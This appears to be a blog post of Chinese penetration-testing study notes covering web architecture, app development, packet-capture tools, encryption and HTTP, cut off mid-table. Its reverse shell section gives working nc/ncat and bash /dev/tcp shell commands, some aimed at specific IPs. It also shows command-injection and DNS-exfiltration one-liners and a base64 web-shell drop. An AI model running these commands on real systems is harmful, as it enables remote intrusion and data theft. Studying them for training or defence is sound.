[{"id":"b08904c0bab28ee83d3b8e8bd866184d","title":"网安知识点笔记（持续更新中）","content":"网安知识点\n基础入门\n一、Web 应用\nWeb 四大件\n1.系统\n\nLinux、windows、macos\n\n2.中间件\n\n我们经常管 web 中间件叫做 web 服务器或者 web 容器，中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。\n也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）\n常见的 web 中间件有: Apache Websphere IIS tomcat JBoss Weblogic IBM HTTP Server NGINX\n核心功能包括：\n\n1.HTTP 协议处理：解析请求并生成响应（如 Apache、Nginx 的 HTTP 引擎）\n2.静态资源服务：直接返回 HTML、CSS、图片等文件\n3.动态内容支持：通过 PHP、Node.js 等语言生成个性化数据\n4.安全控制：SSL/TLS 加密、访问权限管理\n\n\n\n中间件配置对后续部署的影响\n中间件（如 Nginx、Tomcat、Redis）的配置直接影响系统的性能、稳定性和可维护性，具体如下：\n\n负载均衡：Nginx 可配置反向代理，将请求分发到多个后端服务器，避免单节点过载，提升系统可用性。\n缓存策略：Redis 作为缓存中间件，合理配置缓存过期时间和淘汰策略，可减少数据库访问压力，加快响应速度。\n安全防护：中间件可配置 SSL 证书（HTTPS）、请求过滤（防 SQL 注入、XSS），增强系统安全性。\n日志与监控：中间件的日志配置（如访问日志、错误日志）便于后续故障排查，监控配置（如 CPU / 内存占用）可提前发现性能瓶颈\n\n3.数据库\n\n常见的有：mysql，mssql，access\n\n本地存储：\n\n源码和数据库放在一起\n\n站库分离：\n\n\n将网站应用程序（前端 + 后端）与数据库服务器分离部署在不同服务器上，优势包括：\n\n\n提升性能：应用和数据库服务器资源独立分配，避免相互抢占资源（如 CPU、内存）。\n\n\n增强安全性：数据库服务器可单独配置防火墙和访问策略，减少直接暴露风险。\n\n\n便于扩展：应用和数据库可各自根据流量需求扩容，例如数据库可通过主从复制提升读性能。\n\n\n云数据库：\n\n安全组和登陆方式配置可以更加复杂。甚至有 oos 对象存储服务，专门用来放置图片和视频，更加安全\n\n4.源码\n实现网站功能的代码集合，包括：\n\n1.前端技术：HTML/CSS/JavaScript 构建用户界面，框架如 Vue、React\n2.后端逻辑：PHP、Python、Java 等处理业务\n3.架构模式：\n\n单体应用：传统模式，代码集中\n微服务：模块式拆分，适合复杂系统\n\n\n\n源码类型：\n\n开源、商业、自研\n\nWeb 架构\n1.常规化\n\n原理：源码数据都在同服务器\n影响：无，常规安全测试手法\n\n2.站库分离\n\n原理：源码数据库不在同服务器\n存储：其他服务器上数据库&amp;云数据库产品\n影响：数据被单独存放，能连接才可影响数据\n\n3.前后端分离\n\n原理：前端 JS 框架，API 传输数据\n影响：\n\n1.前端页面大部分不存在漏洞\n2.后端管理大部分不在同域名\n3.获得权限有可能不影响后端\n\n\n\n4.宝塔+phpstudy\n\n原理：打包类集成环境，权限配置或受配置\n影响：攻击者权限对比区别\n区别：宝塔更安全一点\n\n5.Docker 容器\n\n原理：虚拟化技术独立磁盘空间\n影响：攻击者虚拟空间磁盘\n\n6.建站分配站\n\n1.托管\n2.申请\n原理：利用别人域名模版建立\n影响：实质安全测试非目标资产\n\n7.静态 Web\n\n例子：大学学的 html 设计网站\n原理：数据没有传输性（js 传输不算）\n影响：无漏洞\n\n8.WAF\n\n原理：Web 应用防火墙，旨在提供保护\n影响：常规 Web 安全测试手段会受到拦截\n演示：免费 D 盾防护软件\nWindows2012 + IIS +D 盾\n\n\n9.CDN\n\n原理：内容分发服务，旨在提高访问速度\n影响：隐藏真实源 IP，导致对目标测试错误\n演示：阿里云备案域名全局 CDN 加速服务\nWindows2012 + BT 宝塔面板 + CDN 服务\n\n\n10.OSS\n\n\n原理：云存储服务，旨在提高访问速度\n\n\n演示：https://cloudreve.org/\nWindows2012 + cloudreve + 阿里云 OSS\nhttps://github.com/cloudreve/Cloudreve/releases/tag/3.7.1\n1、启动应用\n2、登录管理\n3、配置存储信息\n4、更改用户组存储属性\n\n\n阿里云 OSS:\n1、开通 OSS\n2、新建 Bucket\n3、配置 Bucket 属性\n4、配置 Access 访问\n\n\n为什么要使用第三方存储？\n\n静态文件会占用大量带宽\n加载速度\n存储空间\n\n影响：\n\n\n上传的文件或解析的文件均来自于 OSS 资源，无法解析，单独存储\n\n\n1、修复上传安全\n\n\n2、文件解析不一样\n\n\n3、但 Accesskey 隐患\n\n\n\n\n\n11.反向代理\n\n\n正向代理为客户端服务, 客户端主动建立代理访问目标（不代理不可达）\n反向代理为服务端服务, 服务端主动转发数据给可访问地址（不主动不可达）\n\n\n原理：通过网络反向代理转发真实服务达到访问目的\n\n\n影响：访问目标只是个代理，并非真实应用服务器\n\n\n注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！\n\n\n补充：正向代理就相当于一个服务器你无法访问自己找了个代理服务器去访问\n反向代理就是你本来无法访问那个服务器，所以服务器那边整了个搭理服务器让你访问\n\n\n12.负载均衡\n\n原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务器加载服务，测试过程中存在多个目标情况\n\n二、App 应用\n应用开发架构\n1.原生开发\n原生 APP 开发是指针对特定平台(iOS/Android)使用官方语言和工具进行开发的方式。\n安卓一般使用 java 语言开发，当然现在也有 kotlin 语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。\n原生开发有以下特点：\n（1）平台特性\n\niOS 使用 Swift/Objective-C + Xcode 开发，遵循 Apple 设计规范\nAndroid 使用 Java/Kotlin + Android Studio 开发，遵循 Material Design\n\n（2）安全优势\n\n性能优化好，可直接调用系统安全 API\n可实施更严格的安全措施如代码混淆、完整性校验\n支持双向 TLS(mTLS)等高级安全协议\n\n（3）安全风险\n\n需防范逆向工程(反编译、动态调试)\nAPI 接口暴露风险\n平台差异导致的安全策略不一致\n\n（4）网安测试要点\n\n接口安全测试(抓包分析)\n本地数据存储安全\n组件权限配置检查\n\n（5）安全影响\n\n反编译&amp;抓包&amp;常规测试\n逆向的角度去分析逻辑设计安全\n\n2.H5 语言开发\nH5(HTML5)是 HTML 的第五代标准，作为现代 Web 开发的核心技术，它已成为构建跨平台应用的重要工具。\n使用 H5 开发的好处有很多，可多端复用，比如浏览器端，ios 端，当然 H5 开发的体验是没有原生好的。一般来说如果这个页面需要分享出去的话，就用 H5 开发。\nH5 开发具有以下特点：\n（1）H5 技术基础\n\n核心组件：HTML5(结构)+CSS3(样式)+JavaScript(逻辑)，三者协同工作\n关键 API：Canvas 绘图、WebGL(3D 渲染)、Web Audio(音频处理)、Geolocation(定位)等\n存储机制：支持 localStorage/sessionStorage 本地存储，比 Cookie 更安全但需防范 XSS 攻击\n\n（2）安全特性\n\n沙箱机制：默认运行在浏览器安全沙箱中，限制系统资源访问\nCORS 策略：通过跨域资源共享策略控制外部资源访问\nHTTPS 支持：强制要求混合内容中的敏感资源使用安全传输\n\n（3）安全风险\n\nXSS 漏洞：动态内容注入风险高于原生应用\n数据泄露：本地存储数据可能被恶意读取\n中间人攻击：网络阐述层需额外加密保护\n\n3.使用 flutter 开发\nFlutter 是 Google 推出的跨平台应用开发框架，使用 Dart 语言编写，能够构建 iOS、Android、Web 及桌面端应用。但由于是近几年退出的的，技术比较新，生态还不完善，开发效率偏低\nFlutter 开发具有以下特点：\n（1）核心特性\n\n跨平台支持：一套代码可编译为 iOS、Android、Web、Windows、macOS 和 Linux 应用\n高性能渲染：使用 Skia 引擎直接渲染，绕过平台原生组件，性能接近原生应用\n热重载功能：修改代码后无需重启应用即可看到效果，大幅提升开发效率\n\n（2）安全优势\n\n代码混淆支持：可对 Dart 代码进行混淆，增加逆向工程难度\n安全存储机制：提供 flutter_secure_storage 等插件安全存储敏感数据\nHTTPS 强制支持：网络请求默认强制使用 HTTPS 加密传输\n\n（3）安全风险\n\nDart 代码反编译：相比原生代码更易被反编译分析\n插件安全依赖：第三方插件可能引入安全漏洞\n跨平台一致性风险：不同平台可能实现安全机制不一致\n\n（4）网安测试要点\n\n接口安全测试：检查 API 接口的认证、授权和数据加密\n本地存储检查：验证敏感数据是否加密存储\n权限管理审计：检查应用是否遵循最小权限原则\n代码混淆验证：确认发布版本是否经过充分混淆\n\n4.常规 Web 开发\nWeb 开发是构建在互联网上运行的网站和应用程序的过程，主要分为前端和后端两大技术方向。\nWeb App 软件开发简单地说，就是开发一个网站，然后加入 app 的壳。Web App 一般非常小，内容都是 app 内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且 app 内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。\nWeb 开发具有以下特点：\n（1）核心技术栈\n\n前端技术：\n\nHTML：定义网页结构和内容\nCSS：控制网页样式和布局\nJavaScript：实现交互功能和动态效果\n前端框架：React、Vue、Angular 等提高开发效率\n\n\n后端技术：\n\n服务器语言：PHP、Java、Python、Node.js 等\n数据库：MySQL、PostgreSQL、MongoDB 等\nWeb 服务器：Apache、Nginx 等\n\n\n\n（2）安全特性\n\n浏览器安全机制：\n\n同源策略限制跨域访问\nCSP(内容安全策略)可缓解 XSS 攻击\nHTTPS 加密传输保障数据安全\n\n\n认证与授权：\n\n支持多种认证方式(OAuth、JWT 等)\n可实施细粒度访问控制\n\n\n\n（3）安全风险\n\n常见漏洞：\n\nXSS(跨站脚本攻击)\nSQL 注入\nCSRF(跨站请求伪造)\n文件上传漏洞\n\n\n数据安全风险：\n\n敏感信息泄露\n会话劫持\nAPI 接口滥用\n\n\n\n（4）网安测试要点\n\n渗透测试：\n\n检查输入验证和输出编码\n测试认证和会话管理机制\n验证敏感数据保护措施\n\n\n代码审计\n\n检查安全编码实践\n识别硬编码凭证\n评估第三方库风险\n\n\n\n三、反弹 shell\n1.文件上传下载\n作用：解决无图形化&amp;解决数据传输\n使用：在 ip 地址搭建 web 在目录上放我们的工具，访问即可下载，我们利用网站生成传输文件命令，通过命令执行漏洞让目标下载上我们的工具，然后可以进行我们下一步的操作\n![](…/images/网安知识点/屏幕截图 2025-06-15 232304.png)\n![](…/images/网安知识点/屏幕截图 2025-06-15 233009.png)\n2.反弹 shell 命令\n（1）定义\n\n反弹 Shell 是一种网络攻击技术，被控端（受害者）主动连接控制端（攻击者），并将命令行输入输出重定向到控制端，实现远程控制。与传统的 SSH、Telnet 等 正向连接 相反，反弹 Shell 通过角色反转绕过防火墙等限制\n\n（2）基本原理\n\n控制端：监听指定 TCP/UDP 端口（如 nc -lvp 4444）。\n被控端：执行命令将 Shell 会话重定向到控制端（如 bash -i &amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1），通过 Socket 通信传输数据\n\n（3）正向连接\n\n定义：正向连接指 控制端（攻击者）主动发起连接 至被控端（目标机器），要求目标机器开放指定端口并允许入站连接\n原理：\n\n被控端启动监听服务（如 nc -lvvp 5566 -e /bin/bash）。\n控制端主动连接目标 IP 和端口（如 nc 目标IP 5566），建立 Shell 会话\n\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到本地 5566 端口nc -e cmd -lvp 5566//主动连接目标 5566ncat 47.122.23.131 5566\n\nWindows 控制 Linux\n\n1234//绑定 SH 到本地 5566 端口ncat -e /bin/sh -lvp 5566//主动连接目标 5566nc 47.94.236.117 5566\n\n特点：\n\n控制端主动连接目标\n类似 SSH/Telnet 等传统服务\n适用于内网无防护环境\n\n\n限制：\n\n目标需有固定公网 IP 或端口映射\n防火墙/NAT 可能阻止入站连接\n动态 IP 目标难以持续控制\n\n\n典型场景：\n\n内网渗透：攻击已进入内网，直接连接未防护的目标机器\n服务暴露：目标机器主动开放端口提供远程管理（如数据库服务）\n\n\n\n（4）反向连接\n\n定义：\n\n反向连接指 被控端主动连接控制端，由攻击者预先监听端口，目标机器发起请求建立 Shell 会话\n\n\n原理：\n\n控制端监听端口（如 nc -lvp 4444）。\n被控端执行命令反向连接（如 bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1）\n\n\nWindows 控制 Linux\n\n1234//绑定 CMD 到目标 5566 端口ncat -e /bin/sh 47.122.23.131 5566  //靶机//等待 5566 连接nc -lvvp 5566\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到目标 5566 端口nc -e cmd 47.94.236.117 5566   //靶机//等待 5566 连接ncat -lvvp 5566\n\n特点：\n\n被控端主动出站\n控制端无需暴露 IP\n适应动态 IP 环境\n\n\n优势：\n\n绕过防火墙/NAT 限制\n隐蔽性强，避免 IDS 检测\n适合外网渗透和持久控制\n\n\n典型场景：\n\n防火墙绕过：目标仅允许出站流量（如企业内网）\n动态 IP 控制：目标 IP 频繁变化（如家庭宽带）\n恶意软件分发：木马主动连接 C2 服务器\n\n\n\n（5）正反向连接对比\n\n\n\n对比维度\n正向连接\n反向连接\n\n\n\n\n连接方向\n控制端 → 被控端\n被控端 → 控制端\n\n\n防火墙穿透\n依赖入站规则\n利用出站规则\n\n\n适用环境\n内网无防护\n外网/动态 IP\n\n\n隐蔽性\n易被检测\n隐蔽性高\n\n\n工具依赖\n需目标开放端口\n需控制端监听端口\n\n\n\n（6）命令执行\n\n通过管道符，进行额外的命令执行\nwindows： |  &amp;  ||  &amp;&amp;\nLinux： ;  |  ||  &amp;  &amp;&amp;  （特有``和;）\n例子：\n\nping -c 1 127.0.0.1 ; whoami\n\n\n\n（7）数据不回显\n\n通常我们执行命令，要先看目标是什么系统，但如果没有回显，就不能用 ping -c 1 127.0.0.1 ; whoami\n如果是 Linux 的话，我们可以 ping 反引号+whoami+反引号.dns 网址，就可以在那个网址上看到执行完 whoami 的 ip\n但 windows 不行，windows 并没有``所以我们需要，用别的方法来进行操作，比如\n\n12127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#x27;\\&#x27;,&#x27;xxx&#x27;);$y=&#x27;.dns网址&#x27;;$z=$x+$y;ping $z//我们可以通过powershell将我们想要输出的内容，通过变量进行输出，这样也可以得到我们想要的信息\n四、抓包工具\nFiddler\n\n\n核心定位：HTTP/HTTPS 调试代理，专注 Web 应用层安全分析\n\n\n协议支持：HTTP/HTTPS（可解密 SSL/TLS）、WebSocket。\n\n\n网络安全应用场景：\n\n漏洞挖掘：拦截修改请求/响应，测试 XSS、CSRF、参数篡改等漏洞\n会话劫持：捕获 Cookie/Session ID，重放会话验证身份验证缺陷\nHTTPS 解密：通过中间人攻击（MITM）解密 HTTPS 流量，分析加密内容\n\n\n\n使用技巧：\n\n断点调试：Rules &gt; Automatic Breakpoints 拦截请求修改参数（如注入 Payload）\nAutoResponder：模拟恶意响应（如替换 JS 文件植入后门）\n移动端抓包：配置手机代理至 PC IP+端口（默认 8888），安装 Fiddler 根证书解密 HTTPS\n\n\n\nCharles\n\n核心定位：HTTP/HTTPS 代理，侧重 API 调试与可视化分析\n协议支持：HTTP/HTTPS、FTP、SMTP。\n网络安全应用场景：\n\nAPI 安全测试：树状结构展示请求层级，分析接口参数敏感数据泄露\n重放攻击测试：修改历史请求重复发送，验证服务端幂等性漏洞\n弱网模拟：Proxy &gt; Throttle Settings 测试超时处理、重放攻击成功率\n\n\n使用技巧：\n\nMap 功能：重定向请求至恶意服务器（Tools &gt; Map Remote）\nSSL 代理：Proxy &gt; SSL Proxying Settings 添加 *:443 全局解密 HTTPS\n移动端配置：类似 Fiddler，需安装 Charles 证书（Help &gt; SSL Proxying）\n\n\n\nTcpDump\n\n核心定位：命令行网络嗅探器，适用于服务器层流量捕获\n协议支持：全协议（TCP/IP 栈），包括 ARP、ICMP、DNS 等。\n网络安全应用场景：\n\n网络层攻击检测：抓取 SYN 洪水攻击（tcpdump 'tcp[tcpflags] &amp; tcp-syn != 0'）\n异常流量分析：识别异常 ARP 请求（ARP 欺骗）、异常 ICMP（隧道攻击）\n数据泄露监控：捕获含敏感关键词的明文传输（如 tcpdump -A port 80 | grep &quot;password&quot;）\n\n\n\nBurpSuite\n\n核心定位：集成化 Web 应用渗透测试平台\n协议支持：HTTP/HTTPS、WebSocket。\n网络安全应用场景：\n\n自动化漏洞扫描：Scanner 模块检测 SQL 注入、XSS 等 OWASP Top 10 漏洞\n暴力破解：Intruder 模块自动化密码爆破（如撞库攻击测试）\n逻辑漏洞挖掘：Repeater 修改请求顺序，测试越权、支付漏洞\n\n\n使用技巧：\n\n证书配置：浏览器安装 Burp CA 证书（http://burp/cert）解密 HTTPS\n爬虫与扫描：Spider 映射站点结构，Scanner 自动扫描入口点\n插件扩展：集成 Logger++ 记录历史流量，Autorize 测试垂直越权\n\n\n\nWireshark\n\n核心定位：全协议深度解析的网络协议分析器\n协议支持：超 700 种协议（TCP/IP、DNS、DHCP、SSH 等）。\n网络安全应用场景：\n\n协议漏洞分析：解析异常协议字段（如畸形 DNS 响应引发缓存中毒）\n网络取证：重组 TCP 流追踪攻击路径（Follow TCP Stream）\n恶意软件通信：检测 C2 服务器连接（如识别 DNS 隧道、非标准端口加密流量）\n\n\n使用技巧：\n\n显示过滤器：http.request 过滤 HTTP 请求，tls.handshake 聚焦 TLS 协商\n着色规则：标记异常流量（如 TCP 重传标红）\n统计功能：Statistics &gt; Endpoints 定位高流量异常主机\n\n\n\n科来网络分析系统\n\n核心定位：国产企业级流量分析工具，侧重网络诊断与安全审计\n协议支持：主流协议全覆盖，支持自定义协议解码。\n网络安全应用场景：\n\n内网威胁狩猎：矩阵视图 可视化主机连接，定位横向移动或矿机通信\n木马检测：分析异常 DNS 请求（如频繁解析动态域名）\n数据泄露监控：日志视图 追踪 HTTP 文件传输、SMTP 邮件外发\n\n\n使用技巧：\n\n诊断视图：自动标记 TCP 重传、ARP 欺骗等异常事件\n回溯分析：保存流量回放复现攻击链（文件 &gt; 保存抓包文件）\n自定义协议：解码私有协议或恶意软件通信格式\n\n\n\n各个抓包工具的差异\n\n\n\n工具\n最佳场景\n协议侧重\n安全测试优势\n\n\n\n\nFiddler\nWeb 调试/移动端 HTTPS 分析\nHTTP/HTTPS\n请求篡改、会话劫持\n\n\nCharles\nAPI 安全/弱网测试\nHTTP/HTTPS\n流量重定向、重放攻击\n\n\nTcpdump\n服务器层流量捕获\n全协议\n实时攻击检测、命令行高效操作\n\n\nBurp Suite\nWeb 渗透测试\nHTTP/HTTPS\n自动化漏洞扫描、暴力破解\n\n\nWireshark\n全协议深度解析\n700+协议\n协议漏洞分析、网络取证\n\n\n科来\n内网威胁狩猎/网络诊断\n主流协议+自定义\n可视化追踪、自动异常诊断\n\n\n\n五、算法加密\n1.算法加密的应用对象和安全价值\n（1）数据传输保护\n\nHTTPS/TLS：采用混合加密（RSA 交换密钥 + AES 加密数据），防中间人窃听。TLS 1.3 已禁用弱算法（如 RC4、SHA-1），优先支持 AES-GCM 和 ChaCha20-Poly1305。\n端到端加密：消息应用（如 Signal）使用双棘轮协议，每次会话更新密钥，防历史消息解密\n\n（2）敏感数据存储\n\n数据库字段加密：信用卡号、身份证号等采用 AES-256 加密，密钥由 HSM（硬件安全模块）管理\n全盘加密：BitLocker（Windows）、FileVault（Mac）使用 XTS-AES 模式，防物理窃取\n\n（3）身份验证与签名\n\n数字证书：RSA/ECC 非对称加密实现身份绑定，CA 私钥泄露将导致信任链崩塌（如沃通事件）\n区块链交易：ECDSA 签名验证资产所有权，私钥丢失即永久丧失资产控制权\n\n2.数据传输\n（1）传输数据-编码型&amp;加密型\n\n某视频\n某 Web 站\n博客登录\nApp 斗地主\n影响：漏洞探针\n\n（2）传输格式-常规&amp;JSON&amp;XML\n\nApp 期 H\nApp 斗地主\n影响：发送漏洞探针，回显数据分析\n\n（3）密码存储-Web&amp;系统&amp;三方应用\n\nZZZCMS&amp;Dz\nWin&amp;Linux\nMSSQL&amp;MYSQL\n影响：安全后渗透测试\n\n（4）代码混淆-源代码加密&amp;逆向保护\n\nPHP&amp;Js 混淆加密\nEXE&amp;JAR 代码保护\n影响：代码审计，逆向破解\n\n为什么要了解数据在传输的时候进行编码？\n\n\n对方服务器可能会在接受的时候进行解码在带入\n\n\n如果我们还是按照原有思路不对自己的 Payload 进行同样编码的话 传入过去的东西就是不认识的东西 测试无效\n\n\n正确方式：测试的话也要进行 payload 同样的加密或编码进行提交\n安全测试漏洞时候 通常都会进行数据的修改增加提交测试\n以数据的正确格式发送 接受才行\n\n\n3.常见加密算法\n3.1.单向散列加密\n（1）核心原理与识别方式\n\n原理：将任意长度输入（消息）通过哈希函数（如 SHA-256）转换为 固定长度的输出（散列值），具有 单向性（不可逆）和 抗碰撞性（不同输入产生相同输出的概率极低）\n优点：方便存储，损耗低：加密/加密对于性能的损耗微乎其微。\n缺点：单向散列加密的缺点就是存在暴力破解的可能性，最好通过加掩码值的方式提高安全性，此外可能存在散列冲突。我们都知道 MD5 加密也是可以破解的。\nmd5 的三个特征：\n\n确定性：一个原始数据的 MD5 值是唯一的，同一个原始数据不可能会计算出多个不同的 MD5 值。\n碰撞性：原始数据与其 MD5 值并不是一一对应的，有可能多个原始数据计算出来的 MD5 值是一样的，这就是碰撞。\n不可逆：也就是说如果告诉你一个 MD5 值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第 4 点，一个给定的 MD5 值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。\n\n\n\n（2）核心算法\n\n安全算法：SHA-256、SHA-3（抗量子计算）\n风险算法：MD5、SHA-1（已被攻破，易碰撞攻击）\n\n（3）当今社会应用场景\n\n密码存储：用户密码存储为散列值（如 bcrypt 加盐哈希），即使数据库泄露也无法还原明文\n文件完整性校验：软件下载站提供文件的 SHA-256 散列值，用户验证文件是否被篡改（如 Tomcat 官网）\n数字签名基础：对消息摘要签名（如 HMAC 算法），确保数据来源可信（API 接口验签）\n云盘秒传：通过文件哈希值匹配云端已有文件，避免重复上传（如百度网盘）\n\n3.2.对称加密\n（1）核心原理与识别方式\n\n原理：加密和解密使用 同一密钥（如 AES-256），算法高效但密钥需安全分发\n优点：对称加密优点是算法公开、计算量小、加密速度快、加密效率高\n缺点：发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。\n识别特征：\n\n加/解密速度快，适合大数据量；\n密钥管理复杂（需安全通道传输密钥）；\n常见算法标识：AES、DES（已淘汰）、3DES。\n\n\n\n（2）核心算法\n\nAES（Advanced Encryption Standard）：\n支持 128/192/256 位密钥，GCM 模式提供认证加密\n3DES：三重 DES 增强安全性，但因性能差被 AES 取代\n\n（3）当今社会应用场景\n\n数据传输加密：\n\nHTTPS 通信中的 会话加密（TLS 握手后使用 AES 加密数据流）\nWi-Fi 安全协议（WPA3 使用 AES-256）\n\n\n静态数据保护：\n\n数据库字段加密（如信用卡号用 AES 加密存储）\n全盘加密工具（如 BitLocker、FileVault）\n\n\n实时通信加密：\n\n视频会议系统（如 Zoom）使用 AES 加密音视频流\n\n\n\n\n3.3.非对称加密\n（1）核心原理与识别方式\n\n原理：使用 密钥对（公钥加密、私钥解密），公钥可公开，私钥保密\n优点：非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。\n缺点：缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。\n识别特征：\n\n加/解密速度慢，适合小数据量（如密钥交换）；\n支持数字签名（私钥签名，公钥验证）；\n常见算法标识：RSA、ECC（椭圆曲线）。\n\n\n\n（2）核心算法\n\nRSA：基于大整数分解难题（密钥 ≥2048 位）\nECC：相同安全强度下密钥更短（256 位 ≈RSA 3072 位），适合移动设备\n\n（3）当今社会应用场景\n\n安全通信基石：\n\nTLS/SSL 握手：通过 RSA/ECC 交换对称会话密钥（如浏览器 HTTPS 连接）\n端到端加密：消息应用（如 Signal）使用 ECDH 协议动态生成密钥\n\n\n数字身份认证：\n\n数字证书（CA 用私钥签名，公钥验证网站身份）\n区块链交易签名（比特币用 ECDSA 验证所有权）\n\n\n数据防篡改：\n\n文档/软件签名（如 Adobe PDF 签名、安卓 APK 签名）\n\n\n\n\n\n3.4.Base 系列加密\n1.Base64\n\n\n原理：\n\n将 3 字节（24 位） 二进制数据按 6 位一组 划分为 4 组，每组映射到 64 字符集（A-Za-z0-9+/），末尾用 = 填充至 4 的倍数。\n示例： &quot;ABC&quot; → 二进制 01000001 01000010 01000011 → 6 位分组 010000 010100 001001 000011 → 映射为 &quot;QUJD&quot;。\n\n\n\n识别特征：\n\n密文含 A-Za-z0-9+/=，长度必为 4 的倍数（如 SGVsbG8=）；\n无小写字母 o、数字 0、大写 I 等易混淆字符。\n\n\n\n攻防应用：\n\n攻击利用：隐藏 Web Shell（echo PD9waHA... | base64 -d &gt; shell.php）\nWAF 绕过：多重编码（Base64 → URL 编码 → Hex）干扰正则检测\n防御场景：邮件附件、HTTPS 证书、图片内嵌（Data URL）。\n\n\n\n安全风险：非加密算法，可直接解码 暴露数据，需搭配 AES 等加密使用\n\n\n2.Base32\n\n原理：将 5 字节（40 位） 数据按 5 位一组 划分为 8 组，映射到 32 字符集（A-Z2-7），用 = 填充至 8 的倍数。\n识别特征：\n\n全大写字母+数字 2-7（如 JBSWY3DP），无 1/8/9/0 等字符；\n长度通常为 8 的倍数。\n\n\n攻防应用：\n\n隐蔽通信：恶意软件命令传输（如 DNS 隧道中隐藏 C2 指令）；\n兼容性优势：比 Base64 更易人工识别（无大小写混淆）\n\n\n\n3.5.加密算法的对比与选型\n\n\n\n技术类型\n代表算法\n密钥管理\n速度\n安全性依赖\n典型应用场景\n攻击风险\n\n\n\n\n单向散列加密\nSHA-256, bcrypt\n无密钥\n极快（纳秒级）\n抗碰撞性\n密码存储、文件校验\n彩虹表攻击（未加盐）\n\n\n对称加密\nAES-256-GCM\n单一密钥，需安全分发\n快（GB/s 级）\n密钥保密性\n数据库加密、实时通信\n侧信道攻击、弱密钥爆破\n\n\n非对称加密\nECC-256, RSA-2048\n密钥对（公钥/私钥）\n慢（KB/s 级）\n私钥保密性\n密钥交换、数字签名\n量子计算威胁（RSA）\n\n\nBase64 编码\n无\n无密钥\n快\n非加密！\nHTTP 数据传输、邮件附件\n裸数据暴露、WAF 绕过\n\n\n\n4.加密算法的特点\n4.1.MD5\n\n由数字“0-9”和字母“a-f”所组成的字符串\n固定的位数 16 和 32 位\n解密需求：密文即可，但复杂的明文可能解不出\n\n4.2.Base64\n\n大小写区分，通过数字和字母的组合\n一般情况下密文尾部都会有两个等号，明文很少的时候则没有\n明文越长密文越长，一般不会出现 “/” “+” 在密文中\n\n4.3.AES、DES\n\n同 BASE64 基本类似，但一般会出现 “/” 和 “+” 在密文中\n解密需求：密文，模式，加密 Key，偏移量，条件满足才可解出\n\n4.4.RSA\n\n特征同 AES, DES 相似，但是长度较长\n解密需求：密文，公钥或私钥即可解出\n\n六、HTTP 数据包\n一、HTPP 数据包基础\n1. 定义与定位\n\n\n本质：HTTP 数据包是客户端（如浏览器）与服务器之间传输数据的格式化信息单元，分为 请求报文（Request）和 响应报文（Response）\n\n\n协议层级：位于 OSI 模型的应用层，依赖传输层 TCP 协议（默认端口 80）建立可靠连接\n\n\n2. 通信模型\n\n\n请求-响应模式：\n\n客户端发送请求 → 服务器返回响应 → 连接关闭（HTTP/1.0）或复用连接（HTTP/1.1+）\n\n\n\n无状态性：每个请求独立，需依赖 Cookie/Session 等机制维持会话状态\n\n\n二、请求报文结构解析\n1. 请求行**（Request Line）**\n1GET /api/data?page=1 HTTP/1.1\n\n\n请求方法：定义操作类型（共 8 种，详见下文）\n\n\n请求路径：资源位置（如 /api/data），可含查询参数（?page=1）。\n\n\n协议版本：HTTP/1.1（主流）或 HTTP/2（二进制分帧）\n\n\n2.请求头**（Request Headers）**\n键值对形式，描述客户端环境及请求属性：\n\n\n\n常用请求头\n功能说明\n\n\n\n\nHost: example.com\n目标域名（HTTP/1.1 强制要求）\n\n\nUser-Agent: ...\n客户端标识（浏览器/操作系统信息）\n\n\nAccept: text/html\n可接收的响应类型（MIME 类型）\n\n\nCookie: id=abc123\n携带会话凭证\n\n\nAuthorization: Bearer ...\n身份认证令牌\n\n\n\n3.请求体**（Request Body）**\n\n适用场景：POST、PUT、PATCH 方法提交数据（如 JSON、表单）\n长度标识：Content-Length 或 Transfer-Encoding: chunked（分块传输）\n\n三、响应报文结构解析\n1.状态行**（Status Line）**\n1HTTP/1.1 200 OK\n\n协议版本：同请求报文。\n状态码：3 位数字，标识处理结果（分类见下表）\n状态文本：描述性短语（如 OK）。\n\n2.状态码分类\n\n\n\n状态码\n分类\n名称\n定义与触发场景\n典型响应头\n幂等性\n\n\n\n\n100\n1xx (信息响应)\nContinue\n服务器已接收请求头，要求客户端继续发送请求体（用于大文件上传前的确认）\nExpect: 100-continue\n-\n\n\n101\n\nSwitching Protocols\n服务器同意协议切换（如 HTTP 升级至 WebSocket）\nUpgrade: websocket\n-\n\n\n102\n\nProcessing\n服务器已接收请求但处理未完成（WebDAV 异步操作）\n-\n-\n\n\n200\n2xx (成功)\nOK\n请求成功，响应体包含资源（GET）或操作结果（POST）\nContent-Type\n是\n\n\n201\n\nCreated\n资源创建成功（常见于 POST/PUT 请求）\nLocation: /new-resource\n否\n\n\n204\n\nNo Content\n请求成功但无返回内容（常见于 DELETE 请求）\n-\n是\n\n\n206\n\nPartial Content\n部分内容响应（支持分块下载或断点续传）\nContent-Range: bytes 0-499/2000\n是\n\n\n301\n3xx (重定向)\nMoved 